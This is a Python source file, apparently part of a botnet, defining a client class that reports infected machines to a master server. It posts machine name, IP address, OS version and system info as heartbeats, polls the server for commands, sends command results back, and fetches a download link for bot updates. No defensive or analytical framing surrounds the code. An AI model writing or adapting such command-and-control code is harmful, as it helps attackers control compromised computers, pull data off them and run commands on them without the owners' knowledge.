import requests, time

class Communicator:

    def __init__(self, master_host):
        self.master_host = master_host

    def sendHeartBeat(self, machine_name, machine_ip, system_version, botnet_verion, system_info):
        body = {
            'machine_name':     machine_name,
            'machine_ip':       machine_ip,
            'system_version':   system_version,
            'botnet_version':   botnet_verion,
            'system_info':      system_info
        }
        r = requests.post(self.master_host + '/api/v1.0/logActiveMachine', json=body)

        if r.status_code != 201:
            return False

        return True

    def getCommands(self, machine_ip, botnet_verion):
        body = {
            'machine_ip':       machine_ip,
            'botnet_version':   botnet_verion
        }
        r = requests.post(self.master_host + '/api/v1.0/getCommandList', json=body)
        return r.json()

    def sendCommandStatus(self, machine_ip, cmd_id, status, result=[]):
        body = {
            'machine_ip':       machine_ip,
            'id':               cmd_id,
            'status':           status,
            'result':           result
        }
        r = requests.post(self.master_host + '/api/v1.0/logCommand', json=body)
        return r.json()
        

    def getLatestVersion(self):
        r = requests.get(self.master_host + '/api/v1.0/getVersion')
        v = r.json()
        r = requests.get(self.master_host + '/api/v1.0/getLatestVersion')
        v['download_link'] = r.text
        
        return v